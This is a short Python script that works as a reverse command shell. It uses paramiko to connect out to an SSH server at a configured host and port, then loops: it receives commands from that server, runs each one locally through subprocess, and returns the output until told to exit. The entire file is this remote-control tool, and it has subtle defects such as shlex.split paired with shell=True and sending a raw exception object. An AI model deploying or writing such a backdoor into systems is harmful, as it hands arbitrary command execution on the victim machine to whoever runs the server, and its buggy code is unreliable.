import shlex
import logging
import paramiko
import subprocess

logging.basicConfig(filename='ssh_client.log', level=logging.DEBUG)

HOST_NAME = '127.0.0.1'
PORT = 2222
USERNAME = 'jesse'
PASSWORD = ''
METHOD = 'GET'
FILEPATCH = ''
LOCALPATH = ''

def ssh_client(host, port, username, password, cmd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, port=port, username=username, password=password)
    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(cmd)
        logging.info(ssh_session.recv(1024).decode())

        while True:
            cmd = ssh_session.recv(1024)
            try:
                cmd = cmd.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'Okay')
            except Exception as e:
                ssh_session.send(e)
                logging.error(e)
    
        client.close()
    
    return 

if __name__ == "__main__":
    ssh_client(HOST_NAME, PORT, USERNAME, PASSWORD, 'whoami')